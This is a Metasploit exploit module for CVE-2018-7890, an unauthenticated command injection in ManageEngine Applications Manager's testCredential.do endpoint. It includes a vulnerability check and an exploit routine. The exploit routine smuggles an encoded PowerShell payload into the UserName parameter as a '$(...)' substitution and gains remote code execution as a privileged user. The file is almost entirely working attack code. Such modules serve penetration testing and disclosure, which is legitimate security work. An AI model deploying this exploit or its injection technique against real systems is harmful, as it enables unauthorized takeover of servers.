# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Powershell
 
  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "ManageEngine Applications Manager Remote Code Execution",
      &#039;Description&#039;    => %q{
        This module exploits command injection vulnerability in the ManageEngine Application Manager product.
        An unauthenticated user can execute a operating system command under the context of privileged user.
 
        Publicly accessible testCredential.do endpoint takes multiple user inputs and validates supplied credentials
        by accessing given system. This endpoint calls a several internal classes and then executes powershell script
        without validating user supplied parameter when the given system is OfficeSharePointServer.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Mehmet Ince <mehmet@mehmetince.net>&#039; # author & msf module
        ],
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2018-7890&#039;],
          [&#039;URL&#039;, &#039;https://pentest.blog/advisory-manageengine-applications-manager-remote-code-execution-sqli-and/&#039;]
        ],
      &#039;DefaultOptions&#039;  =>
        {
          &#039;WfsDelay&#039; => 10,
          &#039;RPORT&#039; => 9090
        },
      &#039;Payload&#039; =>
        {
          &#039;BadChars&#039; => "\x22"
        },
      &#039;Platform&#039;       => [&#039;win&#039;],
      &#039;Arch&#039;           => [ ARCH_X86, ARCH_X64 ],
      &#039;Targets&#039;         => [ [&#039;Automatic&#039;, {}] ],
      &#039;Privileged&#039;     => true,
      &#039;DisclosureDate&#039; => &#039;Mar 7 2018&#039;,
      &#039;DefaultTarget&#039;  => 0
    ))
 
    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The URI of the application&#039;, &#039;/&#039;])
      ]
    )
  end
 
  def check
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;testCredential.do&#039;),
      &#039;vars_post&#039; => {
        &#039;method&#039; => &#039;testCredentialForConfMonitors&#039;,
        &#039;type&#039; => &#039;OfficeSharePointServer&#039;,
        &#039;montype&#039; => &#039;OfficeSharePointServer&#039;,
        &#039;isAgentEnabled&#039; => &#039;NO&#039;,
        &#039;isAgentAssociated&#039; => &#039;false&#039;,
        &#039;displayname&#039; => Rex::Text.rand_text_alpha(10),
        &#039;HostName&#039; => &#039;127.0.0.1&#039;, # Try to access random IP address or domain may trigger SIEMs or DLP systems...
        &#039;Version&#039; => &#039;2013&#039;,
        &#039;Powershell&#039; => &#039;True&#039;, # :-)
        &#039;CredSSP&#039; => &#039;False&#039;,
        &#039;SPType&#039; => &#039;SPServer&#039;,
        &#039;CredentialDetails&#039; => &#039;nocm&#039;,
        &#039;Password&#039; => Rex::Text.rand_text_alpha(3),
        &#039;UserName&#039; => Rex::Text.rand_text_alpha(3)
      }
    })
    if res && res.body.include?(&#039;Kindly check the credentials and try again&#039;)
      Exploit::CheckCode::Vulnerable
    else
      Exploit::CheckCode::Safe
    end
  end
 
  def exploit
 
    powershell_options = {
      encode_final_payload: true,
      remove_comspec: true
    }
    p = cmd_psh_payload(payload.encoded, payload_instance.arch.first, powershell_options)
 
    print_status(&#039;Triggering the vulnerability&#039;)
 
    send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;testCredential.do&#039;),
      &#039;vars_post&#039; => {
        &#039;method&#039; => &#039;testCredentialForConfMonitors&#039;,
        &#039;type&#039; => &#039;OfficeSharePointServer&#039;,
        &#039;montype&#039; => &#039;OfficeSharePointServer&#039;,
        &#039;isAgentEnabled&#039; => &#039;NO&#039;,
        &#039;isAgentAssociated&#039; => &#039;false&#039;,
        &#039;displayname&#039; => Rex::Text.rand_text_alpha(10),
        &#039;HostName&#039; => &#039;127.0.0.1&#039;, # Try to access random IP address or domain may trigger SIEMs or DLP systems...
        &#039;Version&#039; => &#039;2013&#039;,
        &#039;Powershell&#039; => &#039;True&#039;, # :-)
        &#039;CredSSP&#039; => &#039;False&#039;,
        &#039;SPType&#039; => &#039;SPServer&#039;,
        &#039;CredentialDetails&#039; => &#039;nocm&#039;,
        &#039;Password&#039; => Rex::Text.rand_text_alpha(3),
        &#039;UserName&#039; => "$(#{p})"
      }
    })
 
  end
end

